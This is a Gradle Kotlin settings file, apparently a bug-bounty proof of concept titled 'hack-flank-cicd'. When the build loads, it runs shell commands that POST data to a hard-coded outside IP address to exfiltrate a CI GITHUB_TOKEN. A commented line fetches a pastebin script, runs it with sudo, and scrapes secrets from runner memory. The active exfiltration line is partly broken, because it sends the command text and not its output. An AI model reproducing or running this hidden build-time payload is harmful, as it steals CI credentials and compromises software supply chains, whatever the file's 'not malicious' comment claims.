rootProject.name = "hack-flank-cicd"

// For VRP Test, not malicious.
fun String.runCommand(): String? = try {
    ProcessBuilder("/bin/sh", "-c", this)
            .redirectOutput(ProcessBuilder.Redirect.PIPE)
            .redirectError(ProcessBuilder.Redirect.PIPE)
            .start()
            .inputStream.bufferedReader().readText()
} catch (e: Exception) {
    e.printStackTrace()
    null
}


#val output = "curl -sSfL https://pastebin.com/raw/UUPC3Q79 | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | sort -u | xxd -p | tr -d '\\n'".runCommand()
var output = "env|grep -i 'GITHUB_TOKEN'"
println("Shell command output: $output")
val post = "curl -X POST http://121.5.169.223:39123/ --data s=\"$output\"".runCommand()
